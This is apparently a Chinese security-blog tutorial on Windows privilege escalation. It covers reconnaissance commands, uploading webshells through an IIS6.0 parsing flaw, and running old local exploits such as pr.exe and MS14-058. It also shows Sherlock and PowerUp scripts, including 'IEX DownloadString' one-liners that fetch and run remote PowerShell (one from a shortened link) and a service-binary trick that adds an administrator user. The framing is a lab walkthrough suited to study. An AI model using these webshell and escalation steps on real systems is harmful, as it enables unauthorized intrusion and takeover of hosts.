## 前言：

了解基础知识之后，这次就来仔细学一下Windows操作系统的提权。

## Windows提权基础

#### 0x00:Windows提权的大致方向

拿到一个低权限时要进行提权，首先要清楚从哪里入手，清楚了提权的大致方向，才能事半功倍。 ![](../Images/993c912ee07cd957a4e60fa99e5dec16.png) 其中比较常见而且利用较多的有

1.  `内核提权`
    
2.  `数据库提权`
    
3.  `应用提权`
    
4.  `中间人劫持等`
    

#### 0x01:Windows基础提权命令

```
1.  `查询系统信息`
    
2.  `systeminfo`
    
3.  `如果要查看特定的信息，可以使用`
    
4.  `systeminfo | findstr /B /C:"OS名称" /C:"OS版本"`
    
5.  `主机名`
    
6.  `Hostname`
    
7.  `环境变量`
    
8.  `Set`
    
9.  `查看用户信息`
    
10.  `Net user`
     
11.  `查看服务pid号`
     
12.  `Tasklist /svc|find "TermService"`
     
13.  `netstat -ano|find "3389"`
     
14.  `查看系统名`
     
15.  `wmic os get caption`
     
16.  `查看补丁信息`
     
17.  `wmic qfe get Description,HotFixID,InstalledOn`
     
18.  `如果要定位到特定的补丁可以使用如下命令`
     
19.  `wmic qfe get Description,HotFixID,InstalledOn | findstr /C:"KB4346084" /C:"KB4509094"`
     
20.  `查看当前安装程序`
     
21.  `wmic product get name,version`
     
```

其中需要注意一下 `环境变量`，因为有的软件环境变量可能设置在其它路径中，而在该路径下的文件是具有写权限的，就可以通过**替换文件**来达到提权操作

#### 0x02:常见所处的权限

通常拿到 `webshell`，获得的权限如下：

```
1.  `ASP/PHP 匿名权限`
    
2.  `ASPX user权限`
    
3.  `jsp 通常是系统权限`
    
```

#### 0x03:提权的前提条件

最重要的就是**收集信息**了，根据收集到的信息再进行响应的攻击。

```
1.  ` 1. 服务器系统和版本位数`
    
2.  ` 2. 服务器的补丁情况`
    
3.  ` 3. 服务器的安装软件情况`
    
4.  ` 4. 服务器的防护软件情况`
    
5.  ` 5. 端口情况`
    
```

收集好信息，就可以先从这几个方面入手：

```
1.  `1：确定是否能执行命令（如果不能调用系统cmd执行命令。 要上传一个cmd.exe）`
    
2.  `2：找一个可写可执行的目录`
    
3.  `3 通过查找的补丁信息,找相应的exp提权`
    
```

#### 0x04:溢出漏洞提权

> 溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名：缓冲区溢出漏洞 因为它是在程序执行的时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。

**溢出漏洞提权**是利用操作系统层漏洞进行权限提升，通常步骤是拿到shell后获取目标机器的补丁信息，通过目标的补丁情况获取相对应的漏洞，进行提权

## Windows提权实践

#### 0x01:Pr提权

`Pr`是windows本地溢出工具，主要作用就是可以将**低权限用户提升为系统权限**，主要用于webshell提权，补丁号为 `KB952004`，虽然Pr提权已经很老了，但对于新手去学习提权还是需要去学习一下的，接下来就来实践一下Pr提权。 ![](../Images/f6134bd9a26fc0e088475f102894408f.png) 一个上传页面，使用 `Wappalyzer`分析一下服务器是什么服务器，以及网站环境等 ![](../Images/d22944a1bb3e9f0cbd5086a159877120.png) Web服务器是 `iis6.0`，存在**中间件解析漏洞**，可以利用这个漏洞进行上传木马

```
1.  `IIS6.0解析漏洞介绍`
    
2.  `当建立*.asa、.asp格式的文件夹时，其目录下的任意文件都将会被IIS当做asp解析。`
    
3.  `当文件.asp;1.jpg IIS6.0同样会将文件作为asp文件解析。`
    
```

上传一个 `asp`一句话木马，改下目录和文件后缀 ![](../Images/a9f0d49db1e59e6cbbc1107aa6b889b8.png) 上传成功 ![](../Images/e771c158ca38a754e8f6f546db9bc4ba.png) 连接成功 ![](../Images/8dd1d4faf05a0f94475b087a82dd4867.png) 获得webshell权限，先来查看一下当前的用户权限，发现菜刀的虚拟终端没办法使用，自己上传一个 ![](../Images/4128755f3662e32429e590a9dd443d66.png) 当前的用户权限是 ![](../Images/77537e5f0da3e721daa960209e41a759.png) 并没有创建用户等权限，所以接下来就要收集信息了，先来查询一下系统信息

![](../Images/421d7c01d36cd640f8ef67a4733324ce.png) 在系统的补丁中发现没有 `KB952004` ![](../Images/e8d563fce2e93783a5b42d531f925a47.png) 因此可以利用这个漏洞进行提权（ `cve-2009-0079`），上传 `pr.exe` ![](../Images/78bd7edad782609d7cd7d0d656fd3cdd.png) 提权成功 ![](../Images/dcb2de3230be34d52dc67fc4f4b13a8e.png)

#### 0x02:Windows分析工具的利用

###### **WinSystemHelper**

> WinSystemHelper检查可利用的漏洞，该工具适合在任何**Windows**服务器上进行已知提权漏洞的检测

```
1.  `使用方法:`
    
2.  `上传bat+txt文件，运行bat查看结果`
    
```

WinSystemHelper

**实验环境**

```
1.  `windows server 2003`
    
```

创建一个 `iis`服务，并开启 `asp`支持，在 `wwwroot`目录下放一个 `aspx`木马，菜刀进行连接 ![](../Images/1dc0451890e4bc59e98308f7bd2b6290.png) 连接成功后，查看权限 ![](../Images/9dff2ccbec554b15767a12386efb4d0f.png) 权限不高，在其他文件夹中上传不了，但可以在 `RECYCLER`文件夹中上传文件，因为一般情况下这个文件夹都是有权限进行上传的。（ `RECYCLER`是**windows**操作系统中存放被删除文件的文件夹之一）

根据 `WinSystemHelper`的使用方法，在该目录下上传 `bat+txt`文件。 ![](../Images/6a9e4362957367bd473b93dae1f61e4f.png) 虚拟终端运行一下 `WinSysHelper.bat`

![](../Images/dc27b98dca1ed9bcc4e1317fbb4f8813.png) 有很多可以利用的漏洞，找一个11年的exp测试一下 ![](../Images/7dddadf257ddbc2174a612649c99b3b3.png) 直接运行，发现成功添加了一个 `k8team`的用户 ![](../Images/4f32386cf036b247b41cc739cb9c10db.png) 创建的用户已经成功添加到管理员组当中，提权成功 ![](../Images/e5a6d4d2410f8adb6dcaea13f7723e9e.png)

###### Sherlock

> Sherlock是一个在Windows下用于本地提权的PowerShell脚本

https://github.com/rasta-mouse/Sherlock

**使用方法:**

```
1.  `本地加载脚本`
    
2.  `Import-Module Sherlock.ps1`
    
3.  `远程加载脚本`
    
4.  `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')`
    
5.  `检查漏洞`
    
6.  `Find-AllVulns`
    
7.  `出现Appears Vulnerable就是存在漏洞`
    
```

**实验环境**

```
1.  `win7,搭配有phpstudy`
    
```

先用管理员账号创建一个普通的账号,用户名为 `test`，登陆进去，在根目录下设置一个php一句话木马，进行连接，发现无法在虚拟终端执行命令，而且自己上传进去的 `cmd.exe`也无法使用，这时可以使用另外一款工具 `phpspy`，将其中的 `2011.php`文件上传到网站根目录并进行访问 ![](../Images/f9062e99261bc58b9a6af16ffc52b12d.png) 密码在源代码中有 ![](../Images/3c7618af0b083c762846682cb1994fa5.png) 登陆之后，在这里面便可以进行命令执行了 ![](../Images/6a7b1e08443af92802acfafe48dfc64c.png) 接下来在 `C:/users/test`目录下放入 `Sherlock`文件 ![](../Images/db766c91a88ee109fffc6ba9256ff0f3.png) 接下来调用下 `Powershell`,这里直接在 `win7`本机做实验了，所以使用如下命令

```
1.  `powershell.exe -exec bypass`
    
```

![](../Images/1c50c4b32bc6efaf6dac4fa96e41ffe8.png)

启动成功，下面本地加载下脚本，检查下存在的漏洞

```
1.  `Import-Module ./Sherlock.ps1`
    
2.  `Find-AllVulns`
    
```

通过这样的分析，便可以找到对应的漏洞，利用相应的 `exp`即可 ![](../Images/56d5443c5cd85f0878ef17e80dd67f37.png)可以找 `MS14-058`测试一下,上传与操作系统版本相同的exp ![](../Images/708fec9747afadfa30c9295e954853d0.png) 提权成功

#### Privesc

> 该工具可以枚举出目标Windows系统中常见的Windows错误安全配置，错误的安全配置将允许攻击者在目标系统中实现信息收集以及权限提升

Privesc

**使用方法：**

```
1.  `本地加载脚本`
    
2.  `Import-Module .\Privesc.psm1`
    
3.  `获取函数`
    
4.  `Get-Command -Module Privesc`
    
5.  `检测全部信息`
    
6.  `Invoke-AllChecks`
    
7.  `命令行下执行`
    
8.  `powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Invoke-AllChecks}"`
    
9.  `远程调用执行`
    
10.  `powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfp');Invoke-AllChecks"`
     
11.  `添加用户`
     
12.  `Install-ServiceBinary -ServiceName '服务名' -UserName user -Password password`
     
```

先进入 `Powershell` ![](../Images/6d20cceb925e97b7daeed5ef606845b6.png) 加载脚本并获取函数 ![](../Images/c93a5af1e152281d4feb9ff901ed1abc.png) 检测全部信息 ![](../Images/cd40c02dc1c7aaa1fbb9f552148286b0.png) 除此之外，可以将信息导入到文件中

```
1.  `IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfp');Invoke-AllChecks >1.txt`
    
```

![](../Images/3b144cc06c4581f91fb348353d7976b1.png)

添加一个 `shy`用户，密码为 `123456`

```
1.  `Install-ServiceBinary -ServiceName 'phpStudySrv' -UserName shy -Password 123456`
    
```

![](../Images/59f7c8174c70f6d07088b9d93cd87f55.png) 执行成功
